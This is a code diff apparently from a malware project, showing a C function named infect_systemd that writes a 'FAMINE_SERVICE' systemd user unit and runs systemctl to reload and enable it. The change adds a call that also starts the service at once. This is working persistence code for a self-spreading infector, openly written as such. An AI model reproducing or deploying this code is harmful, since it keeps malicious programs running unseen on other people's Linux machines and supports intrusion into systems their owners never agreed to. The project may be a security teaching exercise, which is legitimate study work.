@@ -43,13 +43,15 @@ int infect_systemd() {
     if (write(fd_daemon, FAMINE_SERVICE, literal_len) < literal_len)
         _exit(1);
     
-    // reload and enable daemon
+    // reload, enable and start daemon
     const char* cmd = "/usr/bin/systemctl";
     char* const reload_args[] = {"systemctl", "--user", "daemon-reload", NULL};
     char* const enable_args[] = {"systemctl", "--quiet", "--user", "enable", (char*)service, NULL};
+    char* const start_args[] = {"systemctl", "--quiet", "--user", "start", (char*)service, NULL};
 
     run(cmd, reload_args);
     run(cmd, enable_args);
+    run(cmd, start_args);
 
     return (0);
 }
